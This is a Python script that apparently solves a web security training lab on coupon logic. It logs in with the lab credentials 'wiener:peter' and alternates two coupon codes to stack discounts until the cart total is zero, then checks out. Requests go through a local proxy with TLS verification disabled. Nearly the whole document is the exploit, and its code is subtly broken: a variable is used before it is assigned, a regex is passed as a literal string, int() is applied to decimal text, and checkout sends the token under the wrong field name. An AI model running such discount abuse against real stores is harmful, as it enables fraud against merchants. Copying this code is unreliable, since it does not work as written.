import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def get_csrf_token(session, url):
    res = session.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf'})
    
    if csrf_input:
        csrf_token = csrf_input.get('value')
        return csrf_token
    else:
        print("CSRF token not found in the HTML.")
        return None


def business_logic_exploit(session, url) :
    
    # get the csrf token here
    login_url = url + '/login'
    csrf_token = get_csrf_token(session, login_url)
    data = {'csrf':csrf_token, 'username':'wiener', 'password':'peter'}
    
    # logging wiht the wiener user here
    res = session.post(login_url, data=data, proxies=proxies, verify=False)
    
    register_url = url + '/cart'
    csrf_token = get_csrf_token(session, register_url)  
    
    i=0
    while value != 0 :
        
        if i % 2 :
            data = {'csrf':csrf_token, 'coupon':'NEWCUST5'}
        else :
            data = {'csrf':csrf_token, 'coupon':'SIGNUP30'}
        
        r = session.post(url+'/cart/coupon', data=data, proxies=proxies, verify=False)
        soup  = BeautifulSoup(r.text, 'html.parser')
        pattern = r'<th>\$(\d+\.\d+)</th>'
        digit = soup.find_all(string=pattern)
        value = int(digit[len(digit)-1])
        i += 1
    
    data = {'data':csrf_token}
    session.post(url+'/cart/checkout', data=data, proxies=proxies, verify=False)

if __name__ == "__main__" :
    try :
        url = sys.argv[1]
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    business_logic_exploit(session, url)